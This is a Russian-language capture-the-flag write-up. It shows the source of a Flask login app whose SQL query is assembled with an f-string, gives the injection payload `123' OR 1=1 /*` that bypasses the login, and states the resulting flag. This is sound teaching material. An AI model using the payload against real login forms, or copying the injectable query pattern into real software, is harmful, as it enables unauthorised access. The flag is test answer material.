# Решение SQL

По адресу `http://172.21.0.40:8080/` форма ввода. Если нажать на Help, то получаем исходный код приложения. 

В форматированном формате можно скачать через wget 

```bash
wget http://172.21.0.40:8080/help
```

Вот что получаем 
```python
from flask import Flask, render_template, request
import sqlite3
import hashlib
import time
app = Flask(__name__)

@app.route('/')
def index():
    print(123)
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    print("POST")
    try:
        print(request.form)
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
        user = c.fetchone()

        if user:
            with open("flag.txt", 'r', encoding="utf-8") as file:
                flag = file.read()
            return flag
        else:
            return 'Login failed!'
    except Exception as ex:
        print(ex)
        return "ERROR"



@app.route('/help', methods=['GET'])
def help():
    with open("/app/app.py", 'r', encoding="utf-8") as file:
        flag = file.read()
    return flag



if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8080")
```


----

тут нужно обратить внимание на эту строку 
```python 
c.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
```

Тут можно напрямую менять sql запрос. Так что в login запишем `123' OR 1=1 /*`, а в password пишем любое значение. 

В итоге получаем флаг `StepikCTF{SQl-InjecTi0n-BAN}`

## Как это работает? 

Если подставить наше значение, то получаем

```python 
c.execute(f"SELECT * FROM users WHERE username='123' OR 1=1 /*' AND password='{password}'")
```
/* - все что будет дальше, не обрабатывается, так как считается комментарием. 


Итоговый запрос выглядит вот так
```python 
c.execute(f"SELECT * FROM users WHERE username='123' OR 1=1")
```

То есть условие выполняется всегда, вне зависимости от username и password.